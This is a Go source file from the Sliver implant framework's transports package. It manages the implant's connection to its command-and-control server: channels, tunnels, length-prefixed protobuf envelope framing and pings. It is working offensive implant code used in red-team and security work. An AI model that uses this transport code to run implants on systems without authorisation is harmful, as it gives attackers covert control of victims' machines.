package transports

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"bytes"
	"encoding/binary"
	"errors"
	"io"
	insecureRand "math/rand"
	"net"
	"sync"
	"time"

	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	readBufSize = 16 * 1024 // 16kb
)

// Connection - Abstract connection to the server
type Connection struct {
	Send    chan *pb.Envelope
	Recv    chan *pb.Envelope
	IsOpen  bool
	Done    chan bool
	tunnels *map[uint64]*Tunnel
	stream  io.ReadWriteCloser // Might be empty

	// Closing details
	ErrClosed chan error      // The owner of this connection might want to monitor for its errors
	errClosed error           // The actual error that caused the closing
	Cleanup   func() error    // User can pass this when instantiating a connection
	wg        *sync.WaitGroup // Ensure cleanup not triggered while envelopes to write.
	once      *sync.Once      // Ensure cleanup is done only once
	mutex     *sync.RWMutex
}

// NewConnection - Create new logical connection that receives
// and sends envelopes through an underlying C2 connection.
func NewConnection() *Connection {
	connection := &Connection{
		Send:      make(chan *pb.Envelope),
		Recv:      make(chan *pb.Envelope),
		IsOpen:    true,
		Done:      make(chan bool, 1),
		tunnels:   &map[uint64]*Tunnel{},
		once:      &sync.Once{},
		mutex:     &sync.RWMutex{},
		wg:        &sync.WaitGroup{},
		ErrClosed: make(chan error, 1), // Just in case the caller has not assigned
	}

	return connection
}

// Close - Execute default & user-provided cleanups once
func (c *Connection) Close() (err error) {

	// Never close anything while there still are
	// envelopes to be written to the connection.
	// This is very important for beacons.
	c.wg.Wait()

	c.once.Do(func() {
		// {{if .Config.Debug}}
		log.Printf("Closing implant connection \n")
		// {{end}}
		c.mutex.RLock()
		c.IsOpen = false
		c.mutex.RUnlock()

		// This might help components to notice its time
		// to stop using us, a little ahead of time just in case.
		c.Done <- true

		// When there is an underlying stream, close
		if c.stream != nil {
			err = c.stream.Close()
		}
		// And perform any actions that the
		// user might have provided
		if c.Cleanup != nil {
			err = c.Cleanup()
		}

		// Close the envelopes channels
		// Don't always close Send, because some protocols
		// in some cases might leave room to keep writing.
		close(c.Recv)

		// If we were closed because of an internal error (not the user wish),
		// notify the caller (and block until acknowledged) that we are closed
		// and we have cleaned up our stuff.
		if c.errClosed != nil {
			c.ErrClosed <- c.errClosed
		}
	})
	return
}

// Tunnel - Duplex byte read/write
type Tunnel struct {
	ID uint64

	Reader       io.ReadCloser
	ReadSequence uint64

	Writer        io.WriteCloser
	WriteSequence uint64
}

func init() {
	insecureRand.Seed(time.Now().UnixNano())
}

// Tunnel - Add tunnel to mapping
func (c *Connection) Tunnel(ID uint64) *Tunnel {
	c.mutex.RLock()
	defer c.mutex.RUnlock()
	return (*c.tunnels)[ID]
}

// AddTunnel - Add tunnel to mapping
func (c *Connection) AddTunnel(tun *Tunnel) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	(*c.tunnels)[tun.ID] = tun
}

// RemoveTunnel - Add tunnel to mapping
func (c *Connection) RemoveTunnel(ID uint64) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	delete(*c.tunnels, ID)
}

// RequestSend - Send an envelope to a channel, to be written to the underlying C2 connection
func (c *Connection) RequestSend(envelope *pb.Envelope) {
	c.wg.Add(1) // This envelope should be written to the wire.
	c.Send <- envelope
	return
}

// RequestResend - Retry sending an envelope.
func (c *Connection) RequestResend(data []byte) {
	c.wg.Add(1) // This envelope should be written to the wire.
	c.Send <- &pb.Envelope{
		Type: pb.MsgTunnelData,
		Data: data,
	}
}

// RequestRecv - Returns a channel over which we listen for incoming envelopes
func (c *Connection) RequestRecv() chan *pb.Envelope {
	return c.Recv
}

// Receive - Receive a a task from the server. Blocks until one is received.
func (c *Connection) Receive() (*pb.Envelope, error) {
	for envelope := range c.Recv {
		if envelope == nil {
			return nil, errors.New("received nil envelope from underlying TLV connection")
		}
		return envelope, nil
	}
	return nil, errors.New("did not received any envelope in Receive call")
}

// NewSession - Create a primitive ReadWriteCloser on our goroutines (to rule them all)
func NewSession(stream io.ReadWriteCloser, connection *Connection) error {
	// We need a few clean fields
	connection.stream = stream

	go func() {
		defer connection.Close()
	SEND:
		for {
			select {
			case <-connection.Done:
				break SEND
			case envelope := <-connection.Send:
				// {{if .Config.Debug}}
				log.Printf("[TLV] send loop envelope type %d\n", envelope.Type)
				// {{end}}
				connection.errClosed = streamWriteEnvelope(stream, envelope)

				// This envelope is either written, or lost.
				// In any case we are not responsible for it.
				connection.wg.Done()
			}
		}
	}()

	go func() {
		defer connection.Close()
	RECV:
		for {
			select {
			case <-connection.Done:
				break RECV
			default:
				envelope, err := streamReadEnvelope(stream)
				connection.errClosed = err // Assign the error in case its not nil.
				if err == io.EOF {
					connection.errClosed = io.EOF
					break RECV
				}
				if err == net.ErrClosed {
					connection.errClosed = net.ErrClosed
					break RECV
				}
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[TLV] %s", err)
				}
				// {{end}}
				if err == nil {
					connection.Recv <- envelope
					// {{if .Config.Debug}}
					log.Printf("[TLV] Receive loop envelope type %d\n", envelope.Type)
					// {{end}}
				}
			}
		}
	}()

	return nil
}

const (
	readBufSizeNamedPipe  = 1024
	writeBufSizeNamedPipe = 1024
)

func streamWriteEnvelope(conn io.ReadWriteCloser, envelope *sliverpb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	_, err = conn.Write(dataLengthBuf.Bytes())
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error %s and %d\n", err, dataLengthBuf)
		// {{end}}
	}
	totalWritten := 0
	for totalWritten < len(data)-writeBufSizeNamedPipe {
		n, err2 := conn.Write(data[totalWritten : totalWritten+writeBufSizeNamedPipe])
		totalWritten += n
		if err2 != nil {
			// {{if .Config.Debug}}
			log.Printf("Error %s\n", err)
			// {{end}}
		}
	}
	if totalWritten < len(data) {
		missing := len(data) - totalWritten
		_, err := conn.Write(data[totalWritten : totalWritten+missing])
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error %s", err)
			// {{end}}
		}
	}
	return nil
}

func socketWritePing(stream io.ReadWriteCloser) error {
	// {{if .Config.Debug}}
	log.Print("Socket ping")
	// {{end}}

	// We don't need a real nonce here, we just need to write to the socket
	pingBuf, _ := proto.Marshal(&sliverpb.Ping{Nonce: 31337})
	envelope := sliverpb.Envelope{
		Type: sliverpb.MsgPing,
		Data: pingBuf,
	}
	return streamWriteEnvelope(stream, &envelope)
}

// streamReadEnvelope - Reads a message from the TLS connection using length prefix framing
func streamReadEnvelope(stream io.ReadWriteCloser) (*pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	if len(dataLengthBuf) == 0 || stream == nil {
		panic("[[GenerateCanary]]")
	}
	_, err := stream.Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, net.ErrClosed // TODO:change this with an analysis of the error
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	// readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		// Compute the precise length of the temporary buffer
		var readBuf []byte
		if dataLength-len(dataBuf) > readBufSize {
			readBuf = make([]byte, readBufSize)
		} else {
			readBuf = make([]byte, (dataLength - len(dataBuf)))
		}
		// {{if .Config.Debug}}
		log.Printf("Readbuf size: %d", len(readBuf))
		// {{end}}

		// And read it
		n, err := stream.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if totalRead > dataLength {
			// {{if .Config.Debug}}
			log.Printf("Read error: totalRead %d > dataLength %d", totalRead, dataLength)
			// {{end}}
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return nil, err
	}

	return envelope, nil
}
